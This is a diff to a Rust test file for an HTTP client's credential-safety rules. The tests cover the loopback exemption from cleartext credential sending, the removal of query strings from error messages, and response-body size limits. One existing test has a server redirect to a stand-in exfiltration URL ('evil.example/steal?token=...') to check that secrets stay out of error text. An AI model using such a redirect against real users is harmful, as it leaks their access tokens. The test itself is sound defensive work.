@@ -132,7 +132,10 @@ fn a_credential_never_travels_in_cleartext_outside_loopback() {
     assert_eq!(client(&server).send("GET", &url(&server.url("/v1")), &bearer(), None).unwrap().status, 200);
     // IPv6 loopback is exempt from the transport rule the client applies.
     assert!(contextful_core::connector::attach::check_transport(&url("http://[::1]:9/v1"), "Authorization").is_ok());
-    assert!(contextful_core::connector::attach::check_transport(&url("http://localhost:9/v1"), "Authorization").is_err());
+    // One loopback predicate serves every exemption: the name `localhost` and 127.0.0.0/8 too.
+    assert!(contextful_core::connector::attach::check_transport(&url("http://localhost:9/v1"), "Authorization").is_ok());
+    assert!(contextful_core::connector::attach::check_transport(&url("http://127.0.0.2:9/v1"), "Authorization").is_ok());
+    assert!(contextful_core::connector::attach::check_transport(&url("http://localhost.example:9/v1"), "Authorization").is_err());
 }
 
 /// A run records which header names carried a credential, by name only.
@@ -182,4 +185,13 @@ fn a_failed_requests_message_carries_no_query_or_fragment() {
     let server = redirecting(|_| "http://evil.example/steal?token=t-secret#x".into());
     let f = client(&server).send("GET", &url(&server.url("/start")), &plain(), None).unwrap_err();
     assert!(f.message.contains("http://evil.example/steal") && !f.message.contains("t-secret"), "{f}");
+}
+
+#[test]
+fn a_body_past_the_ceiling_is_permanent() {
+    let server = Server::start(|_| Response::json(200, "{\"rows\":[1,2,3,4,5,6,7,8,9]}"));
+    let c = client(&server).with_body_limit(8);
+    let f = c.send("GET", &url(&server.url("/v1")), &plain(), None).unwrap_err();
+    assert_eq!(f.tag, contextful_core::run::FailureTag::Permanent, "{f}");
+    assert!(f.deterministic, "retrying reads the same body");
 }
